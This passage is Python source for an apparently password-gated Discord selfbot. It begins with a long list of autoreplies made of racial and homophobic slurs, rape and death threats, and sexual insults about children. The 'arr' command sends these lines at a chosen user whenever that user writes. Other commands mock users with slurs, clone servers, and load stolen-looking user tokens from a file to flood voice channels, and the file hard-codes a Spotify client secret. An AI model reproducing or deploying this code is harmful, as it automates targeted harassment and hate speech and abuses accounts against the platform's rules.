"NIGGAS\nTOSS\nU\nAROUND\nFOR\nFUN\nU\nFAT\nFUCK\nSTOP\nPICKING\nUR\nNOSE\nFAGGOT\nILL\nSHOOT\nUR\nFLESH\nTHEN\nFEED\nUR\nDEAD\nCORPSE\nTO\nMY\nDOGS\nU\nNASTY\nIMBECILE\nSTOP\nFUCKING\nTALKING\nIM\nABOVE\nU\nIN\nEVERY\nWAY\nLMAO\nSTFU\nFAT\nNECK\nASS\nNIGGA",
"dirty ass rodent molester",
"ILL\nBREAK\nYOUR\nFRAGILE\nLEGS\nSOFT\nFUCK\nAND\nTHEN\nSTOMP\nON\nUR\nDEAD\nCORPSE",
"weak prostitute",
"stfu dork ass nigga",
"garbage ass slut",
"ur weak",
"why am i so above u rn",
"soft ass nigga",
"frail slut",
"ur slow as fuck",
"you cant beat me",
"shut the fuck up LOL",
"you suck faggot ass nigga be quiet",
"YOU SUCK\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\nwtf\nyoure\nslow\nas\nfuck\nlmao\nSHUT\nTHE\nFUCK\nUP\nLMFAOO\nyou suck faggot ass nigga",
"YOU SUCK\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\nwtf\nyoure\nslow\nas\nfuck\nlmao\nSHUT\nTHE\nFUCK\nUP\nLMFAOO\nyou suck weak ass nigga",
"YOU SUCK\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\nwtf\nyoure\nslow\nas\nfuck\nlmao\nSHUT\nTHE\nFUCK\nUP\nLMFAOO\nyou suck soft ass nigga",
"YOU SUCK\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\nwtf\nyoure\nslow\nas\nfuck\nlmao\nSHUT\nTHE\nFUCK\nUP\nLMFAOO\nyou suck hoe ass nigga", "y ur ass so weak nigga", "yo stfu nb fw u", "com reject", "yo retard stfu", "pedo", "frail fuck",
"weakling", "# stop bothering minors", "# Don't Fold", "cuck", "faggot", "hop off the alt loser" "ðŸ¤¡","sup feces sniffer how u been", "hey i heard u like kids", "femboy", 
"sup retard", "ur actually ass wdf", "heard u eat ur boogers", "zoophile", "doesn't ur mom abuse u", "autistic fuck", "stop fantasizing about ur mom weirdo", "hey slut shut the fuck up","you're hideous bitch shut up and clean my dogs feces","hey slut come lick my armpits","prostitute stfu slut","bitch shut up","you are ass nigga you wanna be me so bad","why do your armpits smell like that","stop eating horse semen you faggot","stop sending me your butthole in DMs gay boy","why are you drinking tap water out of that goats anus","say something back bitch","you have a green shit ring around your bootyhole","i heard you use snake skin dildos","ill cum in your mouth booty shake ass nigga","type in chat stop fingering your booty hole","i heard you worship cat feces","worthless ass slave","get your head out of that toilet you slut","is it true you eat your dads belly button lint? pedo","fuck up baby fucker","dont you jerk off to elephant penis","hey i heard you eat your own hemorroids","shes only 5 get your dick off of her nipples pedo","you drink porta potty water","hey bitch\nstfu\nyou dogshit ass nigga\nill rip your face apart\nugly ass fucking pedo\nwhy does your dick smell like that\ngay ass faggot loser\nfucking freak\nshut up","i\nwill\nrip\nyour\nhead\noff\nof\nyour\nshoulders\npussy\nass\nslime ball","nigga\nshut\nup\npedophile","stfu you dogshit ass nigga you suck\nyour belly button smells like frog anus you dirty ass nigga\nill rape your whole family with a strap on\npathetic ass fucking toad","YOU\nARE\nWEAK\nAS\nFUCK\nPUSSY\nILL\nRIP\nYOUR\nVEINS\nOUT\nOF\nYOUR\nARMS\nFAGGOT\nASS\nPUSSY\nNIGGA\nYOU\nFRAIL\nASS\nLITTLE\nFEMBOY","tranny anus licking buffalo","your elbows stink","frog","ugly ass ostrich","pencil necked racoon","why do your elbows smell like squid testicals","you have micro penis","you have aids","semen sucking blood worm","greasy elbow geek","why do your testicals smell like dead   buffalo appendages","cockroach","Mosquito","bald penguin","cow fucker","cross eyed billy goat","eggplant","sweat gobbler","cuck","penis warlord","slave","my nipples are more worthy than you","hairless dog","alligator","shave your nipples","termite","bald eagle","hippo","cross eyed chicken","spinosaurus rex","deformed cactus","prostitute","come clean my suit","rusty nail","stop eating water balloons","dumb blow dart","shit ball","slime ball","golf ball nose","take that stick of dynamite out of your nose","go clean my coffee mug","hey slave my pitbull just took a shit, go clean his asshole","walking windshield wiper","hornet","homeless pincone","hey hand sanitizer come lick the dirt off my hands","ice cream scooper","aborted fetus","dead child","stop watching child porn and fight back","homeless rodant","hammerhead shark","hey sledgehammer nose","your breath stinks","you cross eyed street lamp","hey pizza face","shave your mullet","shrink ray penis","hey shoe box come hold my balenciagas","rusty cork screw","pig penis","hey cow sniffer","walking whoopee cushion","stop chewing on your shoe laces","pet bullet ant","hey mop come clean my floor","*rapes your ass* now what nigga","hey tissue box i just nutted on your girlfriend come clean it up","watermelon seed","hey tree stump","hey get that fly swatter out of your penis hole","melted crayon","hey piss elbows","piss ball","hey q tip come clean my ears","why is that saxaphone in your anus","stink beetle","bed bug","cross eyed bottle of mustard","hey ash tray","hey stop licking that stop sign","why is that spatula in your anus","hey melted chocolate bar","dumb coconut"
]

import discord
import random
import asyncio
import time
from discord.ext import commands

intents.messages = True
autoreply_tasks = {}  



import random
import time
import asyncio
import discord

@bot.command()
@require_password()
async def arr(ctx, user: discord.User, typing_time: float = 3.0, channel_id: int = None):

    if channel_id is None:
        channel_id = ctx.channel.id  # Default to current channel

    channel = bot.get_channel(channel_id)
    if channel is None:
        await ctx.send(f"Channel with ID {channel_id} not found.")
        return

    last_message_time = 0
    backoff_time = 0.1  # Initial backoff time
    message_cooldown = 2.0  # Minimum time between replies to the same user
    skip_chance = 0.5  # Chance to skip a message during spam

    async def send_autoreply(message):
        nonlocal last_message_time, backoff_time
        try:
            current_time = time.time()
            time_since_last = current_time - last_message_time

            # Skip messages based on cooldown and chance
            if time_since_last < message_cooldown or random.random() < skip_chance:
                return

            random_reply = random.choice(autoreplies)
            async with channel.typing():  # Show typing indicator
                await asyncio.sleep(typing_time)  # Typing indicator duration
            await channel.send(f"{user.mention} {random_reply}")
            
            last_message_time = time.time()
            backoff_time = max(0.1, backoff_time * 0.95)
        except discord.HTTPException as e:
            if e.status == 429:  # Rate limit hit
                retry_after = float(e.response.headers.get('retry_after', 1.0))
                print(f"Rate limited in ar command. Waiting {retry_after}s...")
                backoff_time = min(2.0, backoff_time * 1.5)
                await asyncio.sleep(retry_after)
                await send_autoreply(message)
            else:
                print(f"HTTP Error in ar command: {e}")
                await asyncio.sleep(1)
        except Exception as e:
            print(f"Error in ar command: {e}")
            await asyncio.sleep(1)

    async def reply_loop():
        def check(m):
            return m.author == user and m.channel.id == channel_id

        while True:
            try:
                message = await bot.wait_for('message', check=check)
                # Add small random delay before responding
                await asyncio.sleep(random.uniform(0.1, 0.3))
                await send_autoreply(message)
            except Exception as e:
                print(f"Error in ar reply loop: {e}")
                await asyncio.sleep(1)

    task = bot.loop.create_task(reply_loop())
    autoreply_tasks[(user.id, channel_id)] = task
    await ctx.send(f"Started auto-replying to {user.name} in channel {channel.name} with a {typing_time:.1f}s typing delay.")

@bot.command()
@require_password()
async def arrend(ctx, channel_id: int = None):
    
    if channel_id is None:
        channel_id = ctx.channel.id  # Default to current channel

    tasks_to_stop = [key for key in autoreply_tasks.keys() if key[1] == channel_id]
    
    if tasks_to_stop:
        for user_id in tasks_to_stop:
            task = autoreply_tasks.pop(user_id)
            task.cancel()
            await ctx.send(f"Stopped the auto-reply for user {user_id[0]} in channel {channel_id}.")
    else:
        await ctx.send("No active auto-reply tasks in this channel.")

@bot.command()
@require_password()
async def srvprune(ctx, days: int = 1):
    if not ctx.message.author.guild_permissions.administrator:
        await ctx.send('You need administrator to use this command.', delete_after=5)
        return

    guild = ctx.guild
    try:
        pruned = await guild.prune_members(days=days, compute_prune_count=True, reason='Pruning inactive members')
        await ctx.send(f'Pruned {pruned} members.', delete_after=3)
    except Exception as e:
        print(f'Failed to prune members: {e}')
           
@bot.command()
@require_password()
async def srvc(ctx, source_server_id: int, target_server_id: int):
    source_server = bot.get_guild(source_server_id)
    target_server = bot.get_guild(target_server_id)

    if not source_server or not target_server:
        await ctx.send('Invalid server IDs.')
        return

    # Clone roles from top to bottom
    sorted_roles = sorted(source_server.roles, key=lambda role: role.position, reverse=True)
    for role in sorted_roles:
        if role.is_default():
            continue
        await target_server.create_role(
            name=role.name,
            permissions=role.permissions,
            colour=role.colour,
            hoist=role.hoist,
            mentionable=role.mentionable
        )
        await asyncio.sleep(2)  # Add a 2-second delay after creating each role

    # Clone channels
    for category in source_server.categories:
        new_category = await target_server.create_category(name=category.name)
        await asyncio.sleep(2)  # Add a 2-second delay after creating each category
        for channel in category.channels:
            if isinstance(channel, discord.TextChannel):
                await target_server.create_text_channel(
                    name=channel.name,
                    category=new_category,
                    topic=channel.topic,
                    slowmode_delay=channel.slowmode_delay,
                    nsfw=channel.nsfw
                )
            elif isinstance(channel, discord.VoiceChannel):
                await target_server.create_voice_channel(
                    name=channel.name,
                    category=new_category,
                    bitrate=channel.bitrate,
                    user_limit=channel.user_limit
                )
            await asyncio.sleep(2)
    
    await ctx.send('Server clone complete!')
    
@bot.command()
@require_password()
async def lgcs(ctx):
    if not isinstance(ctx.channel, discord.DMChannel):
        await ctx.send('This command can only be used in direct messages.')
        return

    await ctx.send("Are you sure you want to leave all group DMs? Type 'yes' to confirm or 'no' to cancel.")
    
    def check(msg):
        return msg.author == ctx.author and msg.channel == ctx.channel and msg.content.lower() in ['yes', 'no']
    
    try:
        confirmation_msg = await bot.wait_for('message', timeout=30.0, check=check)
    except asyncio.TimeoutError:
        await ctx.send('Confirmation timed out. No changes were made.')
        return
    
    if confirmation_msg.content.lower() == 'no':
        await ctx.send('Operation cancelled.')
        return

    # Proceed with leaving the group DMs
    left_groups = 0
    for group in bot.private_channels:
        if isinstance(group, discord.GroupChannel):
            try:
                await group.leave()
                left_groups += 1
                await asyncio.sleep(2)
            except discord.Forbidden:
                await ctx.send(f'Failed to leave group: {group.name} due to missing access.')
            except Exception as e:
                await ctx.send(f'An error occurred while leaving group: {group.name}. Error: {e}')

    await ctx.send(f'Left {left_groups} group DMs.')       

@bot.command()
@require_password()
async def faggot(ctx, user: discord.User):
    percentage = random.randint(1, 100)
    await ctx.send(f"{user.mention} is {percentage}% faggot\n nigga a fuckin faggot LMFAO 🏳️‍🌈")

@bot.command()
@require_password()
async def cringe(ctx, user: discord.User):
    percentage = random.randint(1, 100)
    await ctx.send(f"{user.mention} is {percentage}% cringe\n fuckin cringe faggot 🏳️‍🌈")


@bot.command()
@require_password()
async def hindu(ctx, user: discord.User):
    percentage = random.randint(1, 100)
    await ctx.send(f"{user.mention} is {percentage}% Hindu\n go drink cow piss")
    
@bot.command()
@require_password()
async def av(ctx, user: discord.User = None):
    try:
        if user is None:  # If no user is provided, get the bot's own avatar
            user = bot.user


        # Check if the user has an avatar
        if user.avatar:
            avatar_url = user.avatar_url
            await ctx.send(f"Avatar URL: {avatar_url}", delete_after=10101010101001010100101111)  # Delete response message after 10101010101001010100101111 seconds
        else:
            await ctx.send(f"{user.name} does not have an avatar.", delete_after=10101010101001010100101111)  # Delete response message after 10101010101001010100101111 seconds


        # Delete the command message itself after 2 seconds
        await asyncio.sleep(2)
        await ctx.message.delete()
    except Exception as e:
        await ctx.send(f"An error occurred: {e}", delete_after=10101010101001010100101111)  # Delete response message after 10101010101001010100101111 seconds

@bot.command()
@require_password()
async def whois(ctx, user: discord.User = None):
    user = user or ctx.author
    message = (
        f"```\n"
        f"User Info:\n"
        f"ID: {user.id}\n"
        f"Display Name: {user.display_name}\n"
        f"Created At: {user.created_at.strftime('%d/%m/%Y %H:%M:%S')}\n"
    )
    if ctx.guild:  # Only include 'Joined At' if in a server
        message += f"Joined At: {user.joined_at.strftime('%d/%m/%Y %H:%M:%S') if user.joined_at else 'N/A'}\n"
    message += "```"
    await ctx.send(message)

#Scrape Guild icon
@bot.command(aliases=['guildpfp', 'serverpfp', 'servericon'])
@require_password()
async def guildicon(ctx):
    await ctx.message.delete()
    if not ctx.guild.icon_url:
        await ctx.send(f"**{ctx.guild.name}** has no icon")
        return
    await ctx.send(ctx.guild.icon_url)

#Scrape Guild banner
@bot.command(aliases=['serverbanner'])
@require_password()
async def banner(ctx):
    await ctx.message.delete()
    if not ctx.guild.icon_url:
        await ctx.send(f"**{ctx.guild.name}** has no banner")
        return
    await ctx.send(ctx.guild.banner_url)
    
@bot.command(name="userbanner")
async def userbanner(ctx, user: discord.User):
    headers = {
        "Authorization": bot.http.token,
        "Content-Type": "application/json"
    }
    
    url = f"https://discord.com/api/v9/users/{user.id}/profile"
    
    try:
        response = requests.get(url, headers=headers)
        
        if response.status_code == 200:
            data = response.json()
            banner_hash = data.get("user", {}).get("banner")
            
            if banner_hash:
                banner_format = "gif" if banner_hash.startswith("a_") else "png"
                banner_url = f"https://cdn.discordapp.com/banners/{user.id}/{banner_hash}.{banner_format}?size=1024"
                await ctx.send(f"```{user.display_name}'s banner:``` [Birth Sb]({banner_url})")
            else:
                await ctx.send(f"{user.mention} does not have a banner set.")
        else:
            await ctx.send(f"Failed to retrieve banner: {response.status_code} - {response.text}")
    
    except Exception as e:
        await ctx.send(f"An error occurred: {e}")

url = {}  


@bot.command(name="ecchi")
@require_password()
async def ecchi(ctx, member: discord.Member = None):
    
    async with aiohttp.ClientSession() as session:
        async with session.get('https://api.waifu.im/search/?included_tags=ecchi&is_nsfw=true') as response:
            if response.status == 200:
                data = await response.json()
                image_url = data['images'][0]['url']
                await ctx.send(f"```{ctx.author.display_name} shares some ecchi```\n[DEMONIC sb]({image_url})")
            else:
                await ctx.send("```Failed to fetch image, try again later!```")

@bot.command(name="hentai")
@require_password()
async def hentai(ctx, user: discord.user = None):
    
    async with aiohttp.ClientSession() as session:
        async with session.get('https://api.waifu.im/search/?included_tags=hentai&is_nsfw=true') as response:
            if response.status == 200:
                data = await response.json()
                image_url = data['images'][0]['url']
                await ctx.send(f"```{ctx.author.display_name} shares some hentai```\n[DEMONIC  sb]({image_url})")
            else:
                await ctx.send("```Failed to fetch image, try again later!```")

@bot.command(name="uniform")
@require_password()
async def uniform(ctx, member: discord.Member = None):
    async with aiohttp.ClientSession() as session:
        async with session.get('https://api.waifu.im/search/?included_tags=uniform&is_nsfw=true') as response:
            if response.status == 200:
                data = await response.json()
                image_url = data['images'][0]['url']
                await ctx.send(f"```{ctx.author.display_name} shares some uniform content```\n[DEMONIC sb]({image_url})")
            else:
                await ctx.send("```Failed to fetch image, try again later!```")

@bot.command(name="maid")
@require_password()
async def maid(ctx, member: discord.Member = None):
    async with aiohttp.ClientSession() as session:
        async with session.get('https://api.waifu.im/search/?included_tags=maid&is_nsfw=true') as response:
            if response.status == 200:
                data = await response.json()
                image_url = data['images'][0]['url']
                await ctx.send(f"```{ctx.author.display_name} shares some maid content```\n[DEMONIC sb]({image_url})")
            else:
                await ctx.send("```Failed to fetch image, try again later!```")

@bot.command(name="oppai")
@require_password()
async def oppai(ctx, member: discord.Member = None):
    async with aiohttp.ClientSession() as session:
        async with session.get('https://api.waifu.im/search/?included_tags=oppai&is_nsfw=true') as response:
            if response.status == 200:
                data = await response.json()
                image_url = data['images'][0]['url']
                await ctx.send(f"```{ctx.author.display_name} shares some oppai content```\n[DEMONIC sb]({image_url})")
            else:
                await ctx.send("```Failed to fetch image, try again later!```")

@bot.command(name="selfies")
@require_password()
async def selfies(ctx, member: discord.Member = None):
    async with aiohttp.ClientSession() as session:
        async with session.get('https://api.waifu.im/search/?included_tags=selfies&is_nsfw=true') as response:
            if response.status == 200:
                data = await response.json()
                image_url = data['images'][0]['url']
                await ctx.send(f"```{ctx.author.display_name} shares some selfies```\n[DEMONIC sb]({image_url})")
            else:
                await ctx.send("```Failed to fetch image, try again later!```")

@bot.command(name="raiden")
@require_password()
async def raiden(ctx, member: discord.Member = None):
    async with aiohttp.ClientSession() as session:
        async with session.get('https://api.waifu.im/search/?included_tags=raiden-shogun&is_nsfw=true') as response:
            if response.status == 200:
                data = await response.json()
                image_url = data['images'][0]['url']
                await ctx.send(f"```{ctx.author.display_name} shares Raiden content```\n[DEMONIC sb]({image_url})")
            else:
                await ctx.send("```Failed to fetch image, try again later!```")

@bot.command(name="marin")
@require_password()
async def marin(ctx, member: discord.Member = None):
    async with aiohttp.ClientSession() as session:
        async with session.get('https://api.waifu.im/search/?included_tags=marin-kitagawa&is_nsfw=true') as response:
            if response.status == 200:
                data = await response.json()
                image_url = data['images'][0]['url']
                await ctx.send(f"```{ctx.author.display_name} shares Marin content```\n[DEMONIC sb]({image_url})")
            else:
                await ctx.send("```Failed to fetch image, try again later!```")
                
@bot.command()
@require_password()
async def firstmessage(ctx, channel: discord.TextChannel = None):
    channel = channel or ctx.channel  
    try:

        first_message = await channel.history(limit=1, oldest_first=True).flatten()
        if first_message:
            msg = first_message[0]  
            response = f"here."

            await msg.reply(response)  
        else:
            await ctx.send("```No messages found in this channel.```")
    except Exception as e:
        await ctx.send(f"```Error: {str(e)}```")
        
        


forced_nicknames = {}

@bot.command(name="autonick")
@require_password()
async def autonick(ctx, action: str, member: discord.Member = None, *, nickname: str = None):
    global forced_nicknames

    if action == "toggle":
        if member is None or nickname is None:
            await ctx.send("```Please mention a user and provide a nickname.```")
            return

        if ctx.guild.me.guild_permissions.manage_nicknames:
            forced_nicknames[member.id] = nickname
            await member.edit(nick=nickname)
            await ctx.send(f"```{member.display_name}'s nickname has been set to '{nickname}'.```")
        else:
            await ctx.send("```I do not have permission to change nicknames.```")

    elif action == "list":
        if forced_nicknames:
            user_list = "\n".join([f"<@{user_id}>: '{name}'" for user_id, name in forced_nicknames.items()])
            await ctx.send(f"```Users with forced nicknames:\n{user_list}```")
        else:
            await ctx.send("No users have forced nicknames.")

    elif action == "clear":
        if member is None:
            forced_nicknames.clear()
            await ctx.send("```All forced nicknames have been cleared.```")
        else:
            if member.id in forced_nicknames:
                del forced_nicknames[member.id]
                await member.edit(nick=None)  
                await ctx.send(f"```{member.display_name}'s forced nickname has been removed.```")
            else:
                await ctx.send(f"```{member.display_name} does not have a forced nickname.```")
    else:
        await ctx.send("```Invalid action. Use `toggle`, `list`, or `clear`.```")
@bot.event
async def on_member_update(before, after):
    if before.nick != after.nick and after.id in forced_nicknames:
        forced_nickname = forced_nicknames[after.id]
        if after.nick != forced_nickname:  
            try:
                await after.edit(nick=forced_nickname)
                print(f"Nickname for {after.display_name} reset to forced nickname '{forced_nickname}'.")
            except discord.errors.Forbidden:
                print("Bot does not have permission to change nicknames.")

from collections import defaultdict

force_delete_users = defaultdict(bool)  


@bot.command(name="forcepurge")
@require_password()
async def forcepurge(ctx, action: str, member: discord.Member = None):
    if action.lower() == "toggle":
        if member is None:
            await ctx.send("```Please mention a user to toggle force delete.```")
            return
        force_delete_users[member.id] = not force_delete_users[member.id]
        status = "enabled" if force_delete_users[member.id] else "disabled"
        await ctx.send(f"```Auto-delete messages for {member.display_name} has been {status}.```")

    elif action.lower() == "list":

        enabled_users = [f"```<@{user_id}>```" for user_id, enabled in force_delete_users.items() if enabled]
        if enabled_users:
            await ctx.send("```Users with auto-delete enabled:\n```" + "\n".join(enabled_users))
        else:
            await ctx.send("```No users have auto-delete enabled.```")

    elif action.lower() == "clear":
        force_delete_users.clear()
        await ctx.send("```Cleared auto-delete settings for all users.```")

    else:
        await ctx.send("```Invalid action. Use `toggle`, `list`, or `clear`.```")

RECONNECT_DELAY = 0.1  # Delay before attempting to reconnect
RECONNECT_TIME = 120  # Time after which we will disconnect (2 minutes)



# Dictionary to store token-channel mappings for DMs/GCs and Servers
active_connections = {}  # Stores token-channel mappings and connection states

# WebSocket connection function for DMs and Group DMs
async def connect_to_dm_or_gc(token, channel_id):
    """Connect to a DM or Group DM using websockets."""
    uri = 'wss://gateway.discord.gg/?v=9&encoding=json'
    # Create a unique websocket connection per token
    async with websockets.connect(uri, max_size=None) as VOICE_WEBSOCKET:
        try:
            # Identify payload
            identify_payload = {
                'op': 2,
                'd': {
                    'token': token,
                    'intents': 513,
                    'properties': {
                        '$os': 'linux',
                        '$browser': 'my_library',
                        '$device': 'my_library'
                    }
                }
            }
            await VOICE_WEBSOCKET.send(json.dumps(identify_payload))

            # Voice State payload to join the voice channel
            voice_state_payload = {
                'op': 4,
                'd': {
                    'guild_id': None,  # For DMs and group chats
                    'channel_id': str(channel_id),
                    'self_mute': False,
                    'self_deaf': False,
                    'self_video': False
                }
            }
            await VOICE_WEBSOCKET.send(json.dumps(voice_state_payload))

            print(f"Connected to DM/GC channel {channel_id} with token ending in {token[-4:]}.")
            
            # Store this connection mapping and state
            active_connections[token] = {
                'channel_id': channel_id,
                'VOICE_WEBSOCKET': VOICE_WEBSOCKET
            }

            # Monitor connection and reconnect after disconnect
            await monitor_and_reconnect_dm_or_gc(token)

        except Exception as e:
            print(f"An error occurred while connecting to DM/GC channel {channel_id}: {e}")

async def monitor_and_reconnect_dm_or_gc(token):
    """Monitors the connection for each token and reconnects after disconnect."""
    while True:
        try:
            if token in active_connections:
                VOICE_WEBSOCKET = active_connections[token]['VOICE_WEBSOCKET']
                if VOICE_WEBSOCKET and VOICE_WEBSOCKET.closed:
                    print(f"Token ending in {token[-4:]} disconnected. Reconnecting...")
                    
                    # Get the original channel for reconnection
                    channel_id = active_connections[token]['channel_id']
                    await connect_to_dm_or_gc(token, channel_id)  # Reconnect to the same channel with the same token
                    
            await asyncio.sleep(RECONNECT_TIME)  # Check every 2 minutes

        except Exception as e:
            print(f"Reconnect attempt failed for token ending in {token[-4:]}: {e}")
            await asyncio.sleep(RECONNECT_DELAY)

# Standard connection for Server voice channels
async def connect_to_voice(token, channel_id, guild_id):
    """Connect a bot to a specific server voice channel."""
    intents = discord.Intents.default()
    intents.voice_states = True
    bot_instance = commands.Bot(command_prefix="!", intents=intents)

    @bot_instance.event
    async def on_ready():
        print(f"Logged in as {bot_instance.user} using token ending in {token[-4:]}.")
        guild = bot_instance.get_guild(guild_id)
        if not guild:
            print(f"Guild not found for ID {guild_id}.")
            return
        
        channel = discord.utils.get(guild.voice_channels, id=channel_id)
        if not channel:
            print(f"Voice channel not found for ID {channel_id}.")
            return
        
        try:
            await channel.connect()  # Connect to the voice channel
            print(f"Successfully connected to {channel.name} with token ending in {token[-4:]}.")
            
            # Store this connection mapping
            active_connections[token] = {
                'channel_id': channel_id,
                'guild_id': guild_id
            }

        except Exception as e:
            print(f"Failed to connect with token ending in {token[-4:]}: {e}")

    await bot_instance.start(token, bot=False)  # Start the bot with the token

async def connect_all_tokens_to_voice(channel_id, guild_id):
    """Connect all tokens to a specified voice channel in a server."""
    with open("tokens3.txt", "r") as f:  # Now reads from tokens3.txt
        tokens = f.read().splitlines()
    
    tasks = []
    for token in tokens:
        tasks.append(connect_to_voice(token, channel_id, guild_id))
    
    await asyncio.gather(*tasks)

@bot.command()
@require_password()
async def vc(ctx, position: int, channel_id: int):
    """Command to connect to a specific voice channel at a specified position."""
    guild_id = ctx.guild.id if ctx.guild else None
    with open("tokens3.txt", "r") as f:  # Reads from tokens3.txt
        tokens = f.read().splitlines()
    
    if 1 <= position <= len(tokens):
        token = tokens[position - 1]  # Adjust for 1-based index
        
        if ctx.guild:  # Server VC
            # For server voice channels
            await connect_to_voice(token, channel_id, guild_id)
            await ctx.send(f"Connected token at position {position} to server channel {channel_id}.")
        else:  # For DM or Group DM
            await connect_to_dm_or_gc(token, channel_id)  # DM/GC connection
            await ctx.send(f"Connected token at position {position} to DM/GC channel {channel_id}.")
    else:
        await ctx.send(f"Invalid position: {position}. Position must be between 1 and {len(tokens)}.")

@bot.command()
@require_password()
async def vce(ctx, position: int):
    """Command to connect to the calling voice channel at a specified position."""
    if ctx.author.voice and ctx.author.voice.channel:
        channel_id = ctx.author.voice.channel.id
        await vc(ctx, position, channel_id)
    else:
        await ctx.send("You are not connected to any voice channel.")

@bot.command()
@require_password()
async def vca(ctx, channel_id: int):
    """Command to connect all tokens to a specified voice channel."""
    guild_id = ctx.guild.id
    await connect_all_tokens_to_voice(channel_id, guild_id)
    await ctx.send(f"Connected all tokens to channel {channel_id}.")

# Run the bot'

@bot.command()
@require_password()
async def boobs(ctx):
    await ctx.message.delete()

    response = requests.get("https://nekobot.xyz/api/image?type=boobs")
    json_data = json.loads(response.text)
    url = json_data["message"]

    await ctx.channel.send(url)
    
    


        

@bot.command()
@require_password()
async def hboobs(ctx):
    await ctx.message.delete()

    
    response = requests.get("https://nekobot.xyz/api/image?type=hboobs")
    json_data = json.loads(response.text)
    url = json_data["message"]

    await ctx.channel.send(url)


@bot.command()
@require_password()
async def anal(ctx):
    await ctx.message.delete()

    
    response = requests.get("https://nekobot.xyz/api/image?type=anal")
    json_data = json.loads(response.text)
    url = json_data["message"]

    await ctx.channel.send(url)




@bot.command()
@require_password()
async def hanal(ctx):
    await ctx.message.delete()

    
    response = requests.get("https://nekobot.xyz/api/image?type=hanal")
    json_data = json.loads(response.text)
    url = json_data["message"]

    await ctx.channel.send(url)




@bot.command(name="4k")
@require_password()
async def caughtin4k(ctx):
    await ctx.message.delete()

    
    response = requests.get("https://nekobot.xyz/api/image?type=4k")
    json_data = json.loads(response.text)
    url = json_data["message"]

    await ctx.channel.send(url)

    


@bot.command()
@require_password()
async def gif(ctx):
    await ctx.message.delete()

    
    response = requests.get("https://nekobot.xyz/api/image?type=pgif")
    json_data = json.loads(response.text)
    url = json_data["message"]

    await ctx.channel.send(url)
    
import spotipy   
from spotipy.oauth2 import SpotifyOAuth
from spotipy.oauth2 import SpotifyOAuth

SPOTIFY_CLIENT_ID = '4a48f6f0c2594b2ba04560dc9a81c1bd'
SPOTIFY_CLIENT_SECRET = 'e81001326b8e47c19f974d2e60a2998f'
SPOTIFY_REDIRECT_URI = 'http://localhost:8888/callback'  
SCOPE = "user-read-playback-state user-modify-playback-state"

spotify_client = spotipy.Spotify(auth_manager=SpotifyOAuth(
    client_id=SPOTIFY_CLIENT_ID,
    client_secret=SPOTIFY_CLIENT_SECRET,
    redirect_uri=SPOTIFY_REDIRECT_URI,
    scope=SCOPE
))
@bot.command()
@require_password()
async def spotify(ctx, action=None, *args):
    if not action:
        await ctx.send("Usage: `.spotify <unpause/pause/next/prev/volume/current/play/shuffle/addqueue/repeat>`")
        return

    try:
        if action.lower() == "unpause":
            spotify_client.start_playback()
            await ctx.send("``` Resumed playback.```")

        elif action.lower() == "pause":
            spotify_client.pause_playback()
            await ctx.send("```Paused playback.```")

        elif action.lower() == "next":
            spotify_client.next_track()
            await ctx.send("```Skipped to next track.```")

        elif action.lower() == "prev":
            spotify_client.previous_track()
            await ctx.send("```Reverted to previous track.```")

        elif action.lower() == "volume":
            try:
                volume = int(args[0])
                if 0 <= volume <= 100:
                    spotify_client.volume(volume)
                    await ctx.send(f"```Volume set to {volume}%.```")
                else:
                    await ctx.send("```Volume must be between 0 and 100.```")
            except (ValueError, IndexError):
                await ctx.send("```Usage: .spotify volume <0-100>```")

        elif action.lower() == "current":
            current_track = spotify_client.current_playback()
            if current_track and current_track['item']:
                track_name = current_track['item']['name']
                artists = ", ".join([artist['name'] for artist in current_track['item']['artists']])
                await ctx.send(f"``` Now Playing: \n{track_name} by {artists}```")
            else:
                await ctx.send("```No track currently playing.```")

        elif action.lower() == "play":
            query = " ".join(args)
            if query:
                results = spotify_client.search(q=query, type="track", limit=1)
                tracks = results.get('tracks', {}).get('items')
                if tracks:
                    track_uri = tracks[0]['uri']
                    spotify_client.start_playback(uris=[track_uri])
                    await ctx.send(f"```Now Playing: {tracks[0]['name']} by {', '.join([artist['name'] for artist in tracks[0]['artists']])}```")
                else:
                    await ctx.send("```No results found for that song.```")
            else:
                await ctx.send("```Usage: .spotify play <song name> to play a specific song.```")

        elif action.lower() == "shuffle":
            if args and args[0].lower() in ['on', 'off']:
                state = args[0].lower()
                if state == "on":
                    spotify_client.shuffle(True)
                    await ctx.send("```Shuffle mode turned on.```")
                else:
                    spotify_client.shuffle(False)
                    await ctx.send("```Shuffle mode turned off.```")
            else:
                await ctx.send("```Usage: .spotify shuffle <on/off> to toggle shuffle mode.```")

        elif action.lower() == "addqueue":
            query = " ".join(args)
            if query:
                results = spotify_client.search(q=query, type="track", limit=1)
                tracks = results.get('tracks', {}).get('items')
                if tracks:
                    track_uri = tracks[0]['uri']
                    spotify_client.add_to_queue(track_uri)
                    await ctx.send(f"```Added {tracks[0]['name']} by {', '.join([artist['name'] for artist in tracks[0]['artists']])} to the queue.```")
                else:
                    await ctx.send("```No results found for that song.```")
            else:
